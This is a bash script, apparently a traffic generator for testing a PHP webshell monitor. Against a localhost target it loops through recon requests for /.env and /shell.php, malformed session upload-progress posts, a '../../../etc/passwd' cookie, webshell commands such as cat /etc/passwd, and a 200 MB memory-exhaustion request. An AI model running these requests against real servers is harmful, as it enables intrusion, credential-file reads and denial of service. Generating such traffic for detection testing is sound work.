#!/usr/bin/env bash
##############################################################################
# PHP2SHELL ATTACK SIMULATOR - Continuous Exploitation
# 
# Generates CVE-2026-109618/109619 exploitation patterns for testing
# Rate-limited to prevent DoS
#
# Author: php2shell-monitor project
# Version: 1.0
##############################################################################

set -o pipefail

TARGET="${1:-http://localhost:8082}"
INTERVAL="${2:-5}"
LOOP_COUNT="${3:-0}"

TARGET_UPLOAD="${TARGET}/upload.php"
TARGET_INDEX="${TARGET}/index.php"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

log_attack() {
    echo -e "${RED}[ATTACK]${NC} ${1}"
}

log_info() {
    echo -e "${GREEN}[INFO]${NC} ${1}"
}

##############################################################################
# Exploit Patterns
##############################################################################

exploit_upload_progress() {
    # CVE-2026-109618: Multiple upload-progress fields (P2S-007)
    curl -s -X POST \
        -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundary" \
        -H "User-Agent: php2shell/1.0" \
        --data-binary $'------WebKitFormBoundary\r\nContent-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\ntest\r\n------WebKitFormBoundary\r\nContent-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\ntest2\r\n------WebKitFormBoundary--\r\n' \
        "${TARGET_UPLOAD}" > /dev/null 2>&1
    
    log_attack "Upload-Progress DoS (P2S-007)"
}

exploit_memory_exhaustion() {
    # CVE-2026-109618: OOM trigger
    dd if=/dev/zero bs=1M count=200 2>/dev/null | \
    curl -s -X POST \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -H "Cookie: PHPSESSID=php2shell_test" \
        -H "User-Agent: php2shell-scanner/1.0" \
        --data-binary @- \
        "${TARGET_INDEX}" > /dev/null 2>&1
    
    log_attack "Memory exhaustion (P2S-010)"
}

exploit_segfault() {
    # CVE-2026-109619: UAF trigger
    for i in {1..5}; do
        curl -s -X POST \
            -H "Content-Type: multipart/form-data" \
            -H "Cookie: PHP_SESSION_UPLOAD_PROGRESS=../../../etc/passwd" \
            "${TARGET_UPLOAD}" > /dev/null 2>&1 &
    done
    wait
    
    log_attack "Segfault trigger (P2S-011)"
}

exploit_webshell_access() {
    # Post-exploitation patterns
    local payloads=(
        "cmd=id"
        "cmd=whoami"
        "cmd=cat%20/etc/passwd"
        "exec=system('id')"
    )
    
    for payload in "${payloads[@]}"; do
        curl -s "${TARGET}/shell.php?${payload}" > /dev/null 2>&1
    done
    
    log_attack "Webshell commands (P2S-030+)"
}

exploit_phpsessid_cookie() {
    # CVE-2026-109618: PHPSESSID + upload-progress (P2S-006)
    curl -s -X POST \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -H "Cookie: PHPSESSID=php2shell_sid_${RANDOM}" \
        -d "PHP_SESSION_UPLOAD_PROGRESS=exec" \
        "${TARGET_UPLOAD}" > /dev/null 2>&1
    
    log_attack "PHPSESSID + upload-progress (P2S-006)"
}

exploit_simple_scan() {
    # Basic scanning (P2S-001)
    local uris=("/admin.php" "/config.php" "/.env" "/shell.php")
    
    for uri in "${uris[@]}"; do
        curl -s -I "${TARGET}${uri}" > /dev/null 2>&1
    done
    
    log_attack "Reconnaissance scan"
}

##############################################################################
# Main Loop
##############################################################################

main_loop() {
    local count=0
    
    log_info "PHP2Shell Attacker started"
    log_info "Target: ${TARGET}"
    log_info "Interval: ${INTERVAL}s"
    log_info "Mode: $([ ${LOOP_COUNT} -eq 0 ] && echo 'infinite' || echo "max ${LOOP_COUNT}")"
    echo ""
    
    while true; do
        if [ ${LOOP_COUNT} -gt 0 ] && [ ${count} -ge ${LOOP_COUNT} ]; then
            break
        fi
        
        count=$((count + 1))
        log_info "--- Attack sequence ${count} ($(date +%H:%M:%S)) ---"
        
        exploit_simple_scan
        sleep 1
        
        exploit_phpsessid_cookie
        sleep 1
        
        exploit_upload_progress
        sleep 1
        
        exploit_webshell_access
        sleep 1
        
        exploit_segfault
        sleep 2
        
        # Occasional memory exhaustion
        if [ $((count % 5)) -eq 0 ]; then
            timeout 3 exploit_memory_exhaustion &
        fi
        
        log_info "Sequence ${count} complete. Waiting ${INTERVAL}s..."
        sleep ${INTERVAL}
    done
    
    log_info "Attacker completed"
}

trap 'log_info "Attacker shutting down..."; exit 0' SIGTERM SIGINT

main_loop
